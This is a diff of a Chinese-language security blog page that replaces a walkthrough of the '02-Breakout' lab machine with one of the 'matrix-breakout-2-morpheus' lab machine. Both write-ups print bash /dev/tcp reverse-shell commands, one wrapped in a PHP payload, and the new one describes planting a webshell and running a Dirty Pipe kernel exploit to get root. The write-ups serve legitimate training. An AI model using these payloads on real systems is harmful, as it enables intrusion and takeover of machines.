@@ -7,12 +7,12 @@ article: http://ogp.me/ns/article#">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <meta name="keywords" content="">
 
-<title>对02-Breakout的渗透测试 || woejk0x&#39;s blogs</title>
+<title>对matrix-breakout-2-morpheus的渗透测试 || woejk0x&#39;s blogs</title>
 <link rel="icon" href="https://wo3jk.github.ioimages/wang.icon" type="image/x-icon">
 <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
-<meta property="og:title" content="对02-Breakout的渗透测试">
+<meta property="og:title" content="对matrix-breakout-2-morpheus的渗透测试">
 <meta property="og:type" content="website">
-<meta property="og:url" content="https://wo3jk.github.io/2026/01/26/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
+<meta property="og:url" content="https://wo3jk.github.io/2026/02/04/%E5%AF%B9matrix-breakout-2-morpheus%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/index.html">
 <meta property="og:image" content="">
 <meta property="og:site_name" content="woejk0x&#39;s blogs">
 <meta property="og:author" content="woejk0x">
@@ -20,7 +20,7 @@ article: http://ogp.me/ns/article#">
   
   
   
-  <meta name="description" content="信息收集主机发现1nmap192.168.59.1/24端口扫描1nmap-sV-p-192.168.59.143我们尝试去访问一下这些端口，尝试后有80和10000端口可以访问接着我们扫描一下敏感目录，使用命令：1dirsearch-u192.168.59.143整理后发现没有什么可以有用的信息，然后我们在">
+  <meta name="description" content="123456nmap-sn192.168.59.1/24#发现主机192.168.59.141nmap-sV-p-192.168.59.141#开放端口:22(ssh),80,81(http)dirsearch-u192.168.59.141#robots.txt12#利用gobuster进行目录扫描(gob">
 
 
 <script src="/js/wang.js"></script>
@@ -125,10 +125,10 @@ article: http://ogp.me/ns/article#">
 </aside>
 <div class="post-container">
   <article class="post">
-    <h1 class="post-title">对02-Breakout的渗透测试</h1>
+    <h1 class="post-title">对matrix-breakout-2-morpheus的渗透测试</h1>
 
     <div class="post-meta">
-      <span class="post-date">发布于 <time datetime="2026-01-26T05:30:00.000Z">2026-01-26</time></span>
+      <span class="post-date">发布于 <time datetime="2026-02-04T09:22:00.000Z">2026-02-04</time></span>
       
         <span class="post-categories">
           分类：<a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a>, <a class="category-link" href="/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E9%9D%B6%E6%9C%BA%E6%97%A5%E8%AE%B0/">靶机日记</a>
@@ -136,24 +136,41 @@ article: http://ogp.me/ns/article#">
       
       
         <span class="post-updated">
-          最后更新于 <time datetime="2026-01-26T05:34:52.777Z">2026-01-26</time>
+          最后更新于 <time datetime="2026-02-04T11:35:07.496Z">2026-02-04</time>
         </span>
       
       <span style="margin-left:10px;">👁<span id="busuanzi_value_page_pv"></span></span>
     </div>
     <div class="post-content">
-      <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap 192.168.59.1/24</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126122935.png"></p>
-<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -p- 192.168.59.143</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126124244.png"><br>我们尝试去访问一下这些端口，尝试后有80和10000端口可以访问<br>接着我们扫描一下敏感目录，使用命令：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u 192.168.59.143</span><br></pre></td></tr></table></figure>
-<p><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126124945.png">整理后发现没有什么可以有用的信息，然后我们在80端口首页的源代码里面可以看到一个信息。这是一个​<strong>​Brainfuck加密后的信息。</strong><br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126125311.png"><br>我们尝试解密一下，可以看到是：<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126125545.png"><br><code>.2uqPEfj3D&lt;P&#39;a-3</code></p>
-<h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><p>我们使用命令：<code>enum4linux 192.168.59.143</code>，可以看到成功扫描到一个用户cyber<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126125813.png"><br>我们来到之前找到的登录界面尝试登录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">username &#x27;cyber&#x27;</span><br><span class="line">password &#x27;.2uqPEfj3D&lt;P&#x27;a-3&#x27;</span><br></pre></td></tr></table></figure>
-<p>登录成功后可以发现有一个命令行界面<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126130953.png"><br>然后我们查看文件，有一个user.txt里面就有一个flag<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126130913.png"></p>
-<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>我们输入命令查看权限，可以看到tar文件具有执行权限。<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126131138.png"><br>再查看一下有哪些文件，然后我们在&#x2F;var的文件夹下找到了一个文件<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126131403.png"><br>尝试去解压一下这个文件，可以获得一个密码。<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126131756.png"></p>
-<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>kali监听：<code>nc -lvvp 7777</code><br>执行命令：<code>bash -i &gt;&amp; /dev/tcp/192.168.59.128/7777 0&gt;&amp;1</code></p>
-<h2 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h2><p>输入命令<code>su root</code> 然后输入之前获得的密码。<br>成功提权<br>第二个flag就在&#x2F;root下<br><img src="/%E5%AF%B902-Breakout%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/Pastedimage20260126132701.png"></p>
+      <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn 192.168.59.1/24</span><br><span class="line">#发现主机192.168.59.141</span><br><span class="line">nmap -sV -p- 192.168.59.141</span><br><span class="line">#开放端口:22(ssh),80,81(http)</span><br><span class="line">dirsearch -u 192.168.59.141</span><br><span class="line">#robots.txt</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766043499-51382276-f803-40a8-8187-f8b10b028140.png"><!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766105804-27bda221-e215-40b9-943b-b0375d05d15e.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#利用gobuster进行目录扫描(gobuster字典更大)</span><br><span class="line">gobuster dir -u http://192.168.59.141 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766446973-a7403f85-0113-4c64-bdc6-aa25b084baad.png"></p>
+<p>访问192.168.59.141&#x2F;graffiti.php发现这个界面可以写文件</p>
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767766944535-773e96c7-bf23-4549-8b32-9cb853aba4a6.png"></p>
+<p>post请求里有一个是写入文件名，第二个是写入内容，没有任何过滤，直接写入一句话木马，蚁剑连接，第一个FALG文件就在根目录。</p>
+<p>传入反弹shell的执行文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/192.168.59.128/443 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br><span class="line">#攻击机监听</span><br><span class="line">nc -lvnp 443</span><br><span class="line">#反弹成功</span><br></pre></td></tr></table></figure>
+
+<!-- 这是一张图片，ocr 内容为： -->
+<p><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767767115073-45577111-96c5-4f76-a8fc-3db3ccf3f861.png"></p>
+<p>接下来就是提权了</p>
+<p>查看版本号，看看是否存在内核漏洞</p>
+<p>** CVE-2022-0847** (Dirty Pipe) —— 极其危险[<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFjIaE7idy6AjAkQmaAcuRxY_3vGAVhPzLsG1Z_9Y9f2Iqu2tJBFSUbA3N9u46ZVBLaJ95fjt9BzzOEoMKdZ-_I79Vc2o2FC4j8rXdkucUWpqiiiVHfAV4hDYCf1GUcdHAU20ip-J-nBCoHHHeFKwi9e3hVrM_HOO7uKLoaZ6hZK_Tn4Kf6YLXgqtR0K16oTCO1tiLA-n8T-NM=">1</a>][<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQESJE4tgGKsVlvMBtaxGDMBk2qQLePkVOu60xBxrBiTta6u231bne4TFaBeGABtxEqbVw3c3gN5QupVM03hRFkKpCA2BXeupfJNkuoG1YDUxAy0z1sycd05ExmWyKAKT9tZqy79QVBLMBd12U6ZZw==">2</a>][<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFzT4-ipUFtVwzqOUxmc7Pff9DTbo2xPWppa8KZlMXP52iWlxHjgK6DuihhcytiQpfJzKCBIQvs3LIuCLeUV0H3HHjG427JtE_Js_v162bHT3LT70JYnEDdk109dE0_ebc5NCvexu1a5iqu58bRjopFodCsPe1qX2dIdAMG-AA0DFwhNAXk49umqjbyaeAX-3gLxcnDcZEksQYoC3T2FJO78ztnp_KedAmbXzEB8hIwBVak6Pbu4IuV4i5EzbfLlwKgxWfNbX4vmrUM">3</a>]</p>
+<ul>
+<li>影响： 本地普通用户可以利用此漏洞覆盖只读文件中的数据，从而轻松获取 root 权限。[<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQESJE4tgGKsVlvMBtaxGDMBk2qQLePkVOu60xBxrBiTta6u231bne4TFaBeGABtxEqbVw3c3gN5QupVM03hRFkKpCA2BXeupfJNkuoG1YDUxAy0z1sycd05ExmWyKAKT9tZqy79QVBLMBd12U6ZZw==">2</a>][<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQFzT4-ipUFtVwzqOUxmc7Pff9DTbo2xPWppa8KZlMXP52iWlxHjgK6DuihhcytiQpfJzKCBIQvs3LIuCLeUV0H3HHjG427JtE_Js_v162bHT3LT70JYnEDdk109dE0_ebc5NCvexu1a5iqu58bRjopFodCsPe1qX2dIdAMG-AA0DFwhNAXk49umqjbyaeAX-3gLxcnDcZEksQYoC3T2FJO78ztnp_KedAmbXzEB8hIwBVak6Pbu4IuV4i5EzbfLlwKgxWfNbX4vmrUM">3</a>]</li>
+<li>原因： 它是 Linux 内核自 5.8 版本以来最著名的漏洞之一。[<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQESJE4tgGKsVlvMBtaxGDMBk2qQLePkVOu60xBxrBiTta6u231bne4TFaBeGABtxEqbVw3c3gN5QupVM03hRFkKpCA2BXeupfJNkuoG1YDUxAy0z1sycd05ExmWyKAKT9tZqy79QVBLMBd12U6ZZw==">2</a>]</li>
+<li>状态： 该漏洞在内核 5.10.102 中才被修复。这是目前针对该内核版本最稳定、最常用的提权手段。[<a target="_blank" rel="noopener" href="https://www.google.com/url?sa=E&q=https://vertexaisearch.cloud.google.com/grounding-api-redirect/AUZIYQESJE4tgGKsVlvMBtaxGDMBk2qQLePkVOu60xBxrBiTta6u231bne4TFaBeGABtxEqbVw3c3gN5QupVM03hRFkKpCA2BXeupfJNkuoG1YDUxAy0z1sycd05ExmWyKAKT9tZqy79QVBLMBd12U6ZZw==">2</a>]</li>
+</ul>
+<p>在github里寻找Poc利用脚本</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/blob/main/exploit.c">CVE-2022-0847-DirtyPipe-Exploit&#x2F;exploit.c at main · Arinerron&#x2F;CVE-2022-0847-DirtyPipe-Exploit</a></p>
+<p>利用蚁剑上传，编译运行</p>
+<p>拿到权限后在root目录下找到第二个flag<!-- 这是一张图片，ocr 内容为： --><br><img src="https://cdn.nlark.com/yuque/0/2026/png/55707847/1767769739709-8d4f3b05-0ad5-4e70-8c83-aa28365b5da1.png"></p>
 
     </div>
   </article>
@@ -168,11 +185,11 @@ article: http://ogp.me/ns/article#">
                     </div>
                     <div class="title">
                         <p>标题</p>
-                        <p>对02-Breakout的渗透测试</p>
+                        <p>对matrix-breakout-2-morpheus的渗透测试</p>
                     </div>
                         <div class="publish">
                             <p>发布于</p>
-                            <p>2026-01-26</p>
+                            <p>2026-02-04</p>
                         </div>
                     <div class="ccbyncsa-icon">
                         <p>授权协议</p>
@@ -194,13 +211,13 @@ article: http://ogp.me/ns/article#">
     
       <div class="post-prev">
         <span class="nav-label">上一篇</span>
-        <a href="/2026/01/24/%E5%AF%B9napping-1.0.1%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对napping-1.0.1的渗透测试</a>
+        <a href="/2026/02/03/SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E8%BF%9B%E9%98%B6/">SQL注入漏洞基础</a>
       </div>
     
     
       <div class="post-next">
         <span class="nav-label">下一篇</span>
-        <a href="/2026/01/27/%E5%AF%B901-Empire-Lupin-One%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对01-Empire-Lupin-One的渗透测试</a>
+        <a href="/2026/02/04/%E5%AF%B9ELECTRICAL%E7%9A%84%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">对ELECTRICAL的渗透测试</a>
       </div>
     
   </nav>
@@ -276,14 +293,14 @@ article: http://ogp.me/ns/article#">
 
     </div>
     <div class="sidebar-bg">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0"><span class="toc-number">1.1.</span> <span class="toc-text">主机发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F"><span class="toc-number">1.2.</span> <span class="toc-text">端口扫描</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95"><span class="toc-number">2.</span> <span class="toc-text">渗透测试</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">3.1.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83-1"><span class="toc-number">3.2.</span> <span class="toc-text">提权</span></a></li></ol></li></ol>
+        
     </div>
     <div class="sidebar-bg">
         <div class="card-tags">
             
                 <a href="/tags/%E6%A8%A1%E6%8B%9F/" class="tag" aria-label="标签: #模拟">#模拟</a>
             
-                <a href="/tags/Easy/" class="tag" aria-label="标签: #Easy">#Easy</a>
+                <a href="/tags/Medium/" class="tag" aria-label="标签: #Medium">#Medium</a>
             
         </div>
     </div>
